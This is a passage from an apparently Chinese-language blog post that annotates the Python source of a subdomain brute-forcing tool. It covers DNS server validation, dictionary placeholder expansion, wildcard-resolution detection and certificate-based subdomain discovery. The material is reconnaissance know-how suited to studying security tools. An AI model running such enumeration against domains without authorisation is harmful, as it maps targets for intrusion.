class=\"literal\">True</span>)</span><br><span class=\"line\">    dns_servers = []</span><br><span class=\"line\"></span><br><span class=\"line\">    servers_to_test = []</span><br><span class=\"line\">    <span class=\"comment\"># 从字典中加载未被注释的DNS服务器地址</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> server <span class=\"keyword\">in</span> <span class=\"built_in\">open</span>(os.path.join(root_path, <span class=\"string\">'dict/dns_servers.txt'</span>)).readlines():</span><br><span class=\"line\">        server = server.strip()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> server <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> server.startswith(<span class=\"string\">'#'</span>):</span><br><span class=\"line\">            servers_to_test.append(server)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 异步验证DNS服务器，dns_servers为传入的空列表，保存验证通过的DNS服务器地址</span></span><br><span class=\"line\">    loop = asyncio.get_event_loop()</span><br><span class=\"line\">    loop.run_until_complete(async_load_dns_servers(servers_to_test, dns_servers))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 打印有效DNS服务器地址</span></span><br><span class=\"line\">    server_count = <span class=\"built_in\">len</span>(dns_servers)</span><br><span class=\"line\">    print_msg(<span class=\"string\">'\\n[+] %s DNS Servers found'</span> % server_count, line_feed=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> server_count == <span class=\"number\">0</span>:</span><br><span class=\"line\">        print_msg(<span class=\"string\">'[ERROR] No valid DNS Server !'</span>, line_feed=<span class=\"literal\">True</span>)</span><br><span class=\"line\">        sys.exit(-<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> dns_servers</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加载子域名爆破字典</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">load_next_sub</span>(<span class=\"params\">full_scan</span>):</span><br><span class=\"line\">    next_subs = []</span><br><span class=\"line\">    <span class=\"comment\"># 根据full_scan参数判断加载哪个字典</span></span><br><span class=\"line\">    _file = <span class=\"string\">'dict/next_sub_full.txt'</span> <span class=\"keyword\">if</span> full_scan <span class=\"keyword\">else</span> <span class=\"string\">'dict/next_sub.txt'</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 将子域名去重后存入临时集合tmp_set</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(os.path.join(root_path, _file)) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> f:</span><br><span class=\"line\">            sub = line.strip()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> sub <span class=\"keyword\">and</span> sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> next_subs:</span><br><span class=\"line\">                tmp_set = {sub}</span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"comment\"># 如果子域名模块包含占位符，如{alphnum}，则进行替换操作</span></span><br><span class=\"line\">                <span class=\"keyword\">while</span> tmp_set:</span><br><span class=\"line\">                    item = tmp_set.pop()</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> item.find(<span class=\"string\">'{alphnum}'</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> _letter <span class=\"keyword\">in</span> <span class=\"string\">'abcdefghijklmnopqrstuvwxyz0123456789'</span>:</span><br><span class=\"line\">                            tmp_set.add(item.replace(<span class=\"string\">'{alphnum}'</span>, _letter, <span class=\"number\">1</span>))</span><br><span class=\"line\">                    <span class=\"keyword\">elif</span> item.find(<span class=\"string\">'{alpha}'</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> _letter <span class=\"keyword\">in</span> <span class=\"string\">'abcdefghijklmnopqrstuvwxyz'</span>:</span><br><span class=\"line\">                            tmp_set.add(item.replace(<span class=\"string\">'{alpha}'</span>, _letter, <span class=\"number\">1</span>))</span><br><span class=\"line\">                    <span class=\"keyword\">elif</span> item.find(<span class=\"string\">'{num}'</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> _letter <span class=\"keyword\">in</span> <span class=\"string\">'0123456789'</span>:</span><br><span class=\"line\">                            tmp_set.add(item.replace(<span class=\"string\">'{num}'</span>, _letter, <span class=\"number\">1</span>))</span><br><span class=\"line\">                    <span class=\"keyword\">elif</span> item <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> next_subs:</span><br><span class=\"line\">                        next_subs.append(item)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> next_subs</span><br></pre></td></tr></tbody></table></figure>\n\n<p>加载字典的功能中，使用占位符的方式让这个工具更加灵活，字典文件更加通用，并且通过这个方式可以轻松生成大规模的子域名。</p>\n<p>在子域名中还存在一个<strong>泛解析</strong>的问题，这个工具里面解决了这个问题</p>\n<figure class=\"highlight python\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">async_wildcard_test</span>(<span class=\"params\">domain, dns_servers, level=<span class=\"number\">1</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 创建异步DNS解析器</span></span><br><span class=\"line\">        r = dns.asyncresolver.Resolver()</span><br><span class=\"line\">        <span class=\"comment\"># 使用DNS服务器解析域名</span></span><br><span class=\"line\">        r.nameservers = dns_servers</span><br><span class=\"line\">        <span class=\"comment\"># 使用异步DNS查询解析A记录，lijiejie-not-existed-test是一个随机的子域名，理论上不存在</span></span><br><span class=\"line\">        answers = <span class=\"keyword\">await</span> r.resolve(<span class=\"string\">'lijiejie-not-existed-test.%s'</span> % domain, <span class=\"string\">'A'</span>, lifetime=<span class=\"number\">10</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 如果解析成功，讲这些IP手机在ips中，如果解析的IP有效，可能意味着域名启用了通配符解析</span></span><br><span class=\"line\">        ips = <span class=\"string\">', '</span>.join(<span class=\"built_in\">sorted</span>([answer.address <span class=\"keyword\">for</span> answer <span class=\"keyword\">in</span> answers]))</span><br><span class=\"line\">        <span class=\"comment\"># 初步检测，生成一个子域名，并递归调用进一步检测，并将level设置为2</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> level == <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">'any-sub.%s\\t%s'</span> % (domain.ljust(<span class=\"number\">30</span>), ips))</span><br><span class=\"line\">            <span class=\"keyword\">await</span> async_wildcard_test(<span class=\"string\">'any-sub.%s'</span> % domain, dns_servers, <span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 打印提示信息，使用-w参数强制扫描通配符域名</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> level == <span class=\"number\">2</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">'\\nUse -w to enable force scan wildcard domain'</span>)</span><br><span class=\"line\">            sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> domain</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">wildcard_test</span>(<span class=\"params\">domain, dns_servers</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 获取当前的异步事件循环</span></span><br><span class=\"line\">    loop = asyncio.get_event_loop()</span><br><span class=\"line\">    <span class=\"comment\"># 等待异步任务完成</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> loop.run_until_complete(</span><br><span class=\"line\">        <span class=\"comment\"># 并行执行多个异步任务，并返回它们的结果</span></span><br><span class=\"line\">        asyncio.gather(</span><br><span class=\"line\">            async_wildcard_test(domain, dns_servers, level=<span class=\"number\">1</span>)</span><br><span class=\"line\">        )</span><br><span class=\"line\">    )[<span class=\"number\">0</span>]</span><br></pre></td></tr></tbody></table></figure>\n\n<p>通过给出一个不存在的域名检测，判断是否开启了泛解析</p>\n<p>接下来看看扫描模块</p>\n<figure class=\"highlight python\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 爆破模块</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SubNameBrute</span>(<span class=\"title class_ inherited__\">object</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 初始化</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, *params</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 提取传入参数</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.domain, <span class=\"variable language_\">self</span>.options, <span class=\"variable language_\">self</span>.process_num, <span class=\"variable language_\">self</span>.dns_servers, <span class=\"variable language_\">self</span>.next_subs, \\</span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.scan_count, <span class=\"variable language_\">self</span>.found_count, <span class=\"variable language_\">self</span>.queue_size_array, tmp_dir = params</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.dns_count = <span class=\"built_in\">len</span>(<span class=\"variable language_\">self</span>.dns_servers)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.scan_count_local = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.found_count_local = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"comment\"># 初始化DNS解析器</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.resolvers = [dns.asyncresolver.Resolver(configure=<span class=\"literal\">False</span>) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"variable language_\">self</span>.options.threads)]</span><br><span class=\"line\">        <span class=\"keyword\">for</span> r <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.resolvers:</span><br><span class=\"line\">            <span class=\"comment\"># 解析事件</span></span><br><span class=\"line\">            r.lifetime = <span class=\"number\">6.0</span></span><br><span class=\"line\">            <span class=\"comment\"># 超时时间</span></span><br><span class=\"line\">            r.timeout = <span class=\"number\">10.0</span></span><br><span class=\"line\">        <span class=\"comment\"># 优先队列和状态变量</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.queue = PriorityQueue()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.ip_dict = {}</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.found_subs = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.cert_subs = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.timeout_subs = {}</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.no_server_subs = {}</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.count_time = time.time()</span><br><span class=\"line\">        <span class=\"comment\"># 输出日志到文件</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.outfile = <span class=\"built_in\">open</span>(<span class=\"string\">'%s/%s_part_%s.txt'</span> % (tmp_dir, <span class=\"variable language_\">self</span>.domain, <span class=\"variable language_\">self</span>.process_num), <span class=\"string\">'w'</span>)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.normal_names_set = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.lock = asyncio.Lock()</span><br><span class=\"line\">        <span class=\"comment\"># 线程状态</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.threads_status = [<span class=\"string\">'1'</span>] * <span class=\"variable language_\">self</span>.options.threads</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 加载子域名字典</span></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">load_sub_names</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        normal_lines = []</span><br><span class=\"line\">        wildcard_lines = []</span><br><span class=\"line\">        wildcard_set = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">        regex_list = []</span><br><span class=\"line\">        lines = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">        <span class=\"comment\"># 打开文件逐行读取子域名，跳过空行或重复子域名</span></span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"variable language_\">self</span>.options.file) <span class=\"keyword\">as</span> inFile:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> inFile.readlines():</span><br><span class=\"line\">                sub = line.strip()</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> sub <span class=\"keyword\">or</span> sub <span class=\"keyword\">in</span> lines:</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\">                lines.add(sub)</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\"># 判断子域名是否含占位符</span></span><br><span class=\"line\">                brace_count = sub.count(<span class=\"string\">'{'</span>)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> brace_count &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">                    wildcard_lines.append((brace_count, sub))</span><br><span class=\"line\">\t\t\t\t\t<span class=\"comment\"># 占位符处理</span></span><br><span class=\"line\">                    sub = sub.replace(<span class=\"string\">'{alphnum}'</span>, <span class=\"string\">'[a-z0-9]'</span>)</span><br><span class=\"line\">                    sub = sub.replace(<span class=\"string\">'{alpha}'</span>, <span class=\"string\">'[a-z]'</span>)</span><br><span class=\"line\">                    sub = sub.replace(<span class=\"string\">'{num}'</span>, <span class=\"string\">'[0-9]'</span>)</span><br><span class=\"line\">                    <span class=\"comment\"># 去重</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> wildcard_set:</span><br><span class=\"line\">                        wildcard_set.add(sub)</span><br><span class=\"line\">                        regex_list.append(<span class=\"string\">'^'</span> + sub + <span class=\"string\">'$'</span>)</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"comment\"># 普通子域名直接加入列表</span></span><br><span class=\"line\">                    normal_lines.append(sub)</span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.normal_names_set.add(sub)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> regex_list:</span><br><span class=\"line\">            pattern = <span class=\"string\">'|'</span>.join(regex_list)</span><br><span class=\"line\">            _regex = re.<span class=\"built_in\">compile</span>(pattern)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> normal_lines:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> _regex.search(line):</span><br><span class=\"line\">                    normal_lines.remove(line)</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">        <span class=\"comment\"># 普通子域名加入队列，优先级为0</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> normal_lines[<span class=\"variable language_\">self</span>.process_num::<span class=\"variable language_\">self</span>.options.process]:</span><br><span class=\"line\">            <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, _))    <span class=\"comment\"># priority set to 0</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 含占位符的子域名直接加入队列</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> wildcard_lines[<span class=\"variable language_\">self</span>.process_num::<span class=\"variable language_\">self</span>.options.process]:</span><br><span class=\"line\">            <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put(_)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 检测进程状态</span></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">update_counter</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">'1'</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.threads_status:</span><br><span class=\"line\">                <span class=\"keyword\">return</span></span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.scan_count.value += <span class=\"variable language_\">self</span>.scan_count_local</span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.scan_count_local = <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.queue_size_array[<span class=\"variable language_\">self</span>.process_num] = <span class=\"variable language_\">self</span>.queue.qsize()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.found_count_local:</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.found_count.value += <span class=\"variable language_\">self</span>.found_count_local</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.found_count_local = <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.count_time = time.time()</span><br><span class=\"line\">            <span class=\"keyword\">await</span> asyncio.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 检测目标域名的SSL/TLS证书的扩展信息，提取符合条件的子域名</span></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">check_https_alt_names</span>(<span class=\"params\">self, domain</span>):</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"comment\"># 建立异步HTTPS连接</span></span><br><span class=\"line\">            reader, _ = <span class=\"keyword\">await</span> asyncio.open_connection(</span><br><span class=\"line\">                host=domain,</span><br><span class=\"line\">                port=<span class=\"number\">443</span>,</span><br><span class=\"line\">                ssl=<span class=\"literal\">True</span>,</span><br><span class=\"line\">                server_hostname=domain,</span><br><span class=\"line\">            )</span><br><span class=\"line\">            <span class=\"comment\"># 获取证书详细信息</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> reader._transport.get_extra_info(<span class=\"string\">'peercert'</span>)[<span class=\"string\">'subjectAltName'</span>]:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> item[<span class=\"number\">0</span>].upper() == <span class=\"string\">'DNS'</span>:</span><br><span class=\"line\">                    name = item[<span class=\"number\">1</span>].lower()</span><br><span class=\"line\">                    <span class=\"comment\"># 筛选符合条件的子域名</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> name.endswith(<span class=\"variable language_\">self</span>.domain):</span><br><span class=\"line\">                        sub = name[:<span class=\"built_in\">len</span>(name) - <span class=\"built_in\">len</span>(<span class=\"variable language_\">self</span>.domain) - <span class=\"number\">1</span>]    <span class=\"comment\"># new sub</span></span><br><span class=\"line\">                        sub = sub.replace(<span class=\"string\">'*'</span>, <span class=\"string\">''</span>)</span><br><span class=\"line\">                        sub = sub.strip(<span class=\"string\">'.'</span>)</span><br><span class=\"line\">                        <span class=\"comment\"># 去重并添加到任务队列</span></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> sub <span class=\"keyword\">and</span> sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.found_subs <span class=\"keyword\">and</span> \\</span><br><span class=\"line\">                                sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.normal_names_set <span class=\"keyword\">and</span> sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.cert_subs:</span><br><span class=\"line\">                            <span class=\"variable language_\">self</span>.cert_subs.add(sub)</span><br><span class=\"line\">                            <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, sub))</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 查询DNS解析结果，并限制查询的超时时间</span></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">do_query</span>(<span class=\"params\">self, j, cur_domain</span>):</span><br><span class=\"line\">        <span class=\"keyword\">async</span> <span class=\"keyword\">with</span> timeout(<span class=\"number\">10.2</span>):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.resolvers[j].resolve(cur_domain, <span class=\"string\">'A'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 扫描</span></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">scan</span>(<span class=\"params\">self, j</span>):</span><br><span class=\"line\">        <span 